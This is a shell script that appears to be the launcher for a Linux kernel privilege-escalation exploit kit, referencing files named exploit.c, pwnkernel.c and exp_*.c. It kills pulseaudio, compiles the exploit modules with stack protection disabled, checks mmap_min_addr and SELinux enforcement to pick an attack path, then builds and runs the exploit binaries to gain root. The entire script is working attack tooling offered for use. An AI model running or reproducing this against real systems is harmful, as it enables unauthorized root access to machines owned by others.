#!/bin/sh
killall -9 pulseaudio 2> /dev/null 
IS_64=`uname -m`
OPT_FLAG="-ldl -fomit-frame-pointer"
if [ "$IS_64" = "x86_64" ]; then
  OPT_FLAG="-m64 -ldl -fomit-frame-pointer"
fi 
if [ -d /usr/include/selinux ]; then
  OPT_FLAG="$OPT_FLAG -DHAVE_SELINUX -lselinux"
fi

for FILE in exp_*.c; do
    echo "Compiling $FILE..."
    cc -fno-stack-protector -fPIC $OPT_FLAG -shared -o `printf $FILE | cut -d"." -f1`.so $FILE 2> /dev/null
    if [ "$?" = "1" ]; then
       cc -fPIC $OPT_FLAG -shared -o `printf $FILE | cut -d"." -f1`.so $FILE 2> /dev/null
    fi
done

ESCAPED_PWD=`pwd | sed 's/\//\\\\\//g'`
MINADDR=`cat /proc/sys/vm/mmap_min_addr 2> /dev/null`
if [ "$MINADDR" = "" -o "$MINADDR" = "0" ]; then
    sed "s/\/home\/spender/$ESCAPED_PWD/g" exploit.c > exploit1.c
    mv exploit.c exploit2.c
    mv exploit1.c exploit.c
    cc -fno-stack-protector $OPT_FLAG -o exploit exploit.c 2> /dev/null
    if [ "$?" = "1" ]; then
        cc $OPT_FLAG -o exploit exploit.c 2> /dev/null
    fi
    mv -f exploit2.c exploit.c
    ./exploit
elif [ ! -f '/selinux/enforce' ]; then
    sed "s/\/home\/spender/$ESCAPED_PWD/g" exploit.c > exploit1.c
    mv exploit.c exploit2.c
    mv exploit1.c exploit.c
    cc -fno-stack-protector -fPIC $OPT_FLAG -shared -o exploit.so exploit.c 2> /dev/null
    if [ "$?" = "1" ]; then
       cc -fPIC $OPT_FLAG -shared -o exploit.so exploit.c 2> /dev/null
    fi
    mv -f exploit2.c exploit.c
    sed "s/\/home\/spender/$ESCAPED_PWD/g" pwnkernel.c > pwnkernel1.c
    mv pwnkernel.c pwnkernel2.c
    mv pwnkernel1.c pwnkernel.c
    cc $OPT_FLAG -o pwnkernel pwnkernel.c
    mv -f pwnkernel2.c pwnkernel.c
    ./pwnkernel
else
    sed "s/\/home\/spender/$ESCAPED_PWD/g" exploit.c > exploit1.c
    mv exploit.c exploit2.c
    mv exploit1.c exploit.c
    cc -fno-stack-protector $OPT_FLAG -o exploit exploit.c 2> /dev/null
    if [ "$?" = "1" ]; then
       cc $OPT_FLAG -o exploit exploit.c 2> /dev/null
    fi
    mv -f exploit2.c exploit.c
    ./exploit
fi
